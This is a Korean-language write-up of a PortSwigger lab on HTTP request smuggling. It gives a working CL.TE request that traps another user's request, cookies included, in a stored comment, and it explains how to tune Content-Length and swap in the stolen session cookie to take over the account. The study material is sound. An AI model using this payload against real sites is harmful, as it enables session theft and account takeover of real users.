# Lab: Capturing other users' requests

## 개요

- **난이도**: Practitioner
- **주제**: HTTP Request Smuggling — CL.TE / 다른 사용자 요청 캡처 / 세션 탈취
- **링크**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

## 목표

CL.TE 스머글링으로 내장 봇의 요청(쿠키 포함)을 댓글에 캡처하고, 탈취한 세션 쿠키로 피해자 계정에 접근해 문제를 해결한다.

## 005 랩(프론트엔드 헤더 추출)과의 차이

```
[005 랩 — 프론트엔드 추가 헤더 추출]
  대상: 프론트엔드가 추가하는 헤더
  저장: 없음 (응답에 즉시 반영)
  목적: 접근 제어 우회용 헤더 파악

[006 랩 (이번) — 다른 사용자 요청 캡처]
  대상: 다른 사용자(봇)의 실제 요청 (쿠키 포함)
  저장: 댓글에 영구 저장
  목적: 세션 쿠키 탈취 → 계정 탈취
```

## 공격 원리

```
[캡처 함정 설치]
  CL.TE 스머글링으로 불완전한 POST /post/comment 요청을 버퍼에 심는다.
  Content-Length 를 매우 크게 설정 → 백엔드가 다음 요청을 기다림

[피해자 요청 흡수]
  내장 봇(피해자)의 요청이 도착
  → 백엔드: 버퍼의 POST /post/comment body 에 봇 요청 바이트를 이어 붙임
  → 봇 요청 전체(헤더 + 쿠키)가 댓글 body 의 일부가 됨
  → 댓글로 저장

[세션 탈취]
  댓글 목록에서 저장된 봇 요청 확인
  → Cookie: session=VICTIM_TOKEN 추출
  → 해당 쿠키로 계정 접근
```

## 공격 패킷

### Attack 요청 (캡처 함정)

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: [cl]
Transfer-Encoding: chunked
Connection: keep-alive

0

POST /post/comment HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=MY_SESSION
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

csrf=MY_CSRF&postId=1&name=attacker&email=a@a.com&website=&comment=
```

```
핵심 포인트:
  Content-Length: 900 (충분히 크게)
  → 백엔드가 900바이트 body 를 기다리는 동안 연결 유지
  → 봇의 요청이 오면 그 바이트가 body(= comment 내용)에 이어 붙음
  → 봇의 전체 요청 헤더(쿠키 포함)가 comment= 값으로 저장됨

  comment= 로 끝나는 이유:
  → 이후 붙는 봇 요청이 comment 값으로 URL 인코딩 없이 흡수됨
  → 댓글 내용: [봇 요청 전체]
```

### 댓글 확인

Attack 전송 후 댓글 목록(`/post?postId=1`) 확인:

```
attacker 댓글:
  GET / HTTP/1.1
  Host: LAB-ID.web-security-academy.net
  Cookie: session=VICTIM_SESSION_TOKEN   ← 봇 세션 탈취!
  User-Agent: ...
  ...
```

### 탈취한 쿠키로 접근

브라우저 개발자 도구 → Application → Cookies → `session` 값을 `VICTIM_SESSION_TOKEN` 으로 교체 → `/admin` 접근 → carlos 삭제

## Content-Length 설정과 타임아웃

```
[Content-Length 가 너무 크면]
  백엔드가 더 많은 바이트를 기다림
  → 봇 요청이 전부 들어올 수 있음 (쿠키 완전 캡처)
  → 하지만 댓글이 즉시 저장되지 않고 타임아웃 후 저장

[Content-Length 가 너무 작으면]
  봇 요청의 앞부분만 캡처됨
  → Cookie 헤더가 잘릴 수 있음

[권장]
  봇 요청이 충분히 포함되도록 크게 설정 (800~1000)
  반복 시도하면서 댓글에 쿠키가 완전히 캡처되는 값 탐색
```

## 005 랩과의 메커니즘 비교

| 항목 | 005 — 헤더 추출 | 006 — 요청 캡처 |
|------|----------------|----------------|
| 캡처 대상 | 프론트엔드 추가 헤더 | 다른 사용자 전체 요청 |
| 저장 방식 | 응답에 즉시 반영 (검색 결과) | 댓글에 영구 저장 |
| 공격 엔드포인트 | POST /search | POST /post/comment |
| 확인 방법 | follow-up 응답 확인 | 댓글 목록 확인 |
| 최종 목적 | 접근 제어 우회 | 세션 탈취 → 계정 탈취 |
| 타이밍 의존 | 낮음 | 높음 (봇 방문 주기 의존) |

## 핵심 정리

- CL.TE 스머글링으로 **다른 사용자의 요청 전체**(헤더, 쿠키 포함)를 댓글 등 저장소에 캡처할 수 있다.
- `comment=` 처럼 값이 비어있는 파라미터 끝에 smuggled body 를 이어붙이면, 다음 사용자 요청이 그 파라미터 값으로 저장된다.
- 내장 봇이 주기적으로 접속하므로, Attack 전송 후 댓글을 확인하는 반복 시도가 필요하다.
- `Content-Length` 를 충분히 크게 설정해야 쿠키 헤더가 잘리지 않고 완전히 캡처된다.

## 배운 점

### 1. 요청 캡처가 가능한 저장 엔드포인트

```
댓글, 게시글, 프로필, 검색 기록 등
사용자 입력을 저장하고 나중에 조회 가능한 모든 엔드포인트

→ comment= / message= / note= 등 긴 텍스트를 허용하는 파라미터가 유리
```

### 2. HTTP Request Smuggling 공격 범위 전체

```
[취약점 탐지]
  001 CL.TE Differential Response
  002 TE.CL Differential Response

[접근 제어 우회]
  003 CL.TE 프론트엔드 우회
  004 TE.CL 프론트엔드 우회

[정보 추출]
  005 프론트엔드 헤더 추출
  006 다른 사용자 요청 캡처 (이번)

[이후 심화]
  반사형 XSS 유발, 응답 큐 오염 등
```

### 3. 실제 공격 시나리오

```
실제 환경에서는 봇 대신 일반 사용자가 피해자:
  공격자: Attack 전송 (댓글 함정 설치)
  피해자: 사이트 방문
  → 피해자 요청이 댓글에 저장
  → 공격자: 댓글 확인 → 피해자 세션 쿠키 획득
  → 피해자 계정 탈취
```
